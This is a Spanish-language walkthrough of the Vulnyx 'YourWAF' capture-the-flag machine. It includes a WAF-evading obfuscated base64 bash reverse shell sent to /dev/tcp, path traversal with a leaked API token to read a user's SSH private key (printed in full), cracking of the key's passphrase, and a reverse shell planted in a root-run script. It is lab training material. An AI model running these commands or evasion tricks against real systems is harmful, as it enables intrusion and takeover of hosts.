---
icon: flag
---

# YourWAF Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 06:33 EDT
Nmap scan report for 192.168.5.98
Host is up (0.00055s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 1c:ec:5c:5b:fd:fc:ba:f3:4c:1b:0b:70:e6:ef:bf:12 (ECDSA)
|_  256 26:18:c8:ec:34:aa:d5:b9:28:a1:e2:83:b0:d3:45:2e (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.59 (Debian)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 08:00:27:E8:82:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds
```

Veremos varios puertos interesantes, entre ellos el puerto `3000` y el `80`, si entramos en el puerto `80` veremos que hace el intento de cargar una pagina web, pero requiere de un `dominio` llamado `www.yourwaf.nyx` por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano

<IP>    yourwaf.nyx www.yourwaf.nyx
```

Lo guardaremos, ahora si entramos de la siguiente forma a la pagina:

```
URL = http://www.yourwaf.nyx/
```

Veremos una pagina normal aparentemente de un servicio que proporciona un `WAF` web, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## FFUF

Si listamos los `subdominios` que pueda tener dicho `dominio` podremos encontrar lo siguiente:

```shell
ffuf -u http://yourwaf.nyx/ -w <WORDLIST> -H "Host: FUZZ.yourwaf.nyx" -H "User-Agent: Netscape" -fs 0
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://yourwaf.nyx/
 :: Wordlist         : FUZZ: /home/kali/Downloads/subdomains-top1million-5000.txt
 :: Header           : User-Agent: Netscape
 :: Header           : Host: FUZZ.yourwaf.nyx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

www                     [Status: 200, Size: 10722, Words: 3594, Lines: 171, Duration: 33ms]
maintenance             [Status: 200, Size: 292, Words: 58, Lines: 14, Duration: 194ms]
WWW                     [Status: 200, Size: 10722, Words: 3594, Lines: 171, Duration: 82ms]
:: Progress: [4997/4997] :: Job [1/1] :: 337 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

Veremos que hemos descubierto un `subdominio` nuevo, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano

<IP>             yourwaf.nyx www.yourwaf.nyx maintenance.yourwaf.nyx
```

Lo guardamos y entraremos en dicho `subdominio` a ver que vemos.

```
URL = http://maintenance.yourwaf.nyx/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-11 135839.png" alt=""><figcaption></figcaption></figure>

Veremos que es una pagina para ejecutar comandos, si probamos un simple `id` veremos lo siguiente:

```
## id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Pero si probamos un `ls -la`:

```
Forbidden

You don't have permission to access this resource.

---

Apache/2.4.59 (Debian) Server at maintenance.yourwaf.nyx Port 80
```

Veremos que nos `bloquea` el comando compuesto, por lo que vamos a probar a `bypassear` estos comandos, para intentar realizar una `reverse shell`.

## Escalate user www-data

Vamos a probar a codificar el comando de la `reverse shell` muy `ofuscado` para ver si se lo traga.

```shell
echo 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' | base64
/bin/echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNTAvNzc3NyAwPiYxCg==' | base64 -d | /bin/bash -e # Pero lo codificamos con sustitucion
/???/e??o 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNTAvNzc3NyAwPiYxCg==' | /???/b??e64 -d | /???/b??h -e
```

Antes de enviarlo vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos el comando anterior y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.98] 52214
bash: cannot set terminal process group (530): Inappropriate ioctl for device
bash: no job control in this shell
www-data@yourwaf:/var/www/maintenance.yourwaf.nyx$ whoami
whoami
www-data
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user tester

Si investigamos un poco, veremos un archivo bastante interesante del servidor web con el que esta funcionando.

```shell
cd /opt/nodeapp
```

Dentro veremos un archivo llamado `server.js` que pone lo siguiente:

```js
const express = require('express')
const { exec } = require('child_process');
var path = require('path');

const app = express()
const port = 3000

const apiToken = '8c2b6a304191b8e2d81aaa5d1131d83d';


function checkApiToken(req, res, next) {
  let sendApiToken = req.query["api-token"] ?? '';
  if (apiToken !== sendApiToken) {
    res.send("Unauthorized.")
    return;
  }
  next();
}

app.use('/logs', (req, res) => {
  let path_to_file = __dirname + '/logs/modsec_audit.log'
  res.sendFile(path_to_file)
})


app.get('/', checkApiToken, (req, res) => {
  res.send('API de mantenimiento!');
})

app.get('/restart', checkApiToken, (req, res) => {
  exec('reboot', (error, stdout, stderr) => {
    if (error) {
      res.send(`exec error: ${error}`)
      return;
    }
    res.send('Restarting server...');
  });
})

app.get('/readfile', checkApiToken, (req, res) => {
  let file = req.query["file"] ?? '';
  if (file === '') {
    res.send('Error: need file')
    return;
  }
  if (file.indexOf('passwd') !== -1) {
    res.send('ForbiddenError: Forbidden')
    return;
  }
  let path_to_file = __dirname + file
  res.sendFile(path.resolve(path_to_file))
})


app.listen(port,  () => {
  console.log(`Example app listening on port ${port}`)
```

Veremos algo interesante y es que estamos viendo el `TOKEN` de la pagina, junto con el parametro `/readfile` que es interesante de nombre, si vemos como funciona veremos que lee archivos a nivel de sistema, por lo que vamos a probar lo siguiente:

```shell
curl 'http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../../../etc/passwd'
```

No va a dar un `forbidden` por lo que no podremos leer ese archivo, despues de buscar un rato, probamos a realizar lo siguiente:

```shell
curl 'http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../../../home/tester/.ssh/id_rsa'
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
NOmwKPWS5rqFofpdCmmz/n4nRNM=
-----END OPENSSH PRIVATE KEY-----
```

Vemos que obtenemos el `id_rsa` del usuario `tester` por lo que vamos a realizar lo siguiente:

```shell
chmod 600 id_rsa
ssh -i id_rsa tester@<IP>
```

Nos pedira la contraseña del `id_rsa` por lo que vamos a probar a `crackearlo` de esta forma:

```shell
ssh2john id_rsa > hash.ssh | john --wordlist=<WORDLIST> hash.ssh
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 6 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
wafako           (id_rsa)     
1g 0:00:02:42 DONE (2025-09-11 08:34) 0.006168g/s 56.55p/s 56.55c/s 56.55C/s okokok..pajarito
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que lo ha `crackeado` por lo que vamos a utilizarlo de esta forma:

```shell
ssh -i id_rsa tester@<IP>
```

Metemos como contraseña `wafako`...

```
```

Con esto veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user-afa83c8bac2338a439766f22e8245636.txt

```
32056d6dd51c2bb5ef2a002c546cc255
```

## Escalate Privileges

Si volvemos donde esta la informacion de la aplicacion en el `/opt` acordemonos de que vimos un archivo que podia ser editable por el grupo llamado `copylogs` y si hacemos `id`:

```
uid=1000(tester) gid=1000(tester) grupos=1000(tester),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),1001(copylogs)
```

Veremos que pertenecemos a dicho grupo, por lo que podremos realizar lo siguiente.

> copylogs.sh

```bash
#!/bin/bash

# Copia de logs de modsecurity cada 10 sec

cp /var/log/apache2/modsec_audit.log /opt/nodeapp/logs
```

> ecosystem.config.js

```js
module.exports = {
  apps : [{
    name   : "Tester server",
    script : "./server.js",
    exec_mode: 'fork'
  },{
    name : "Copy logs",
    restart_delay: 10000,
    interpreter: '/bin/bash',
    script: "./copylogs.sh"
  }]
}
```

Por lo que vemos en estos archivos el primero lo podemos editar y el segundo nos esta dando la informacion de que dicho archivo que podemos editar se ejecuta cada 10 segundos por el servidor que se esta ejecutando como `root`, por lo que vamos añadir la siguiente linea al archivo `.sh`.

```shell
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Añadida esta linea, vamos a ponernos a la escucha rapidamente:

```shell
nc -lvnp <PORT>
```

Ahora si esperamos un rato, y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.98] 52466
bash: no se puede establecer el grupo de proceso de terminal (3044): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@yourwaf:/opt/nodeapp# whoami
whoami
root
```

Por lo que vemos seremos `root`, por lo que leeremos la `flag` de `root`.

> root-e765ca897810e6e2da0e594113bfe9b3.txt

```
a86f99d5be34faec32e3cfd477a8a282
```
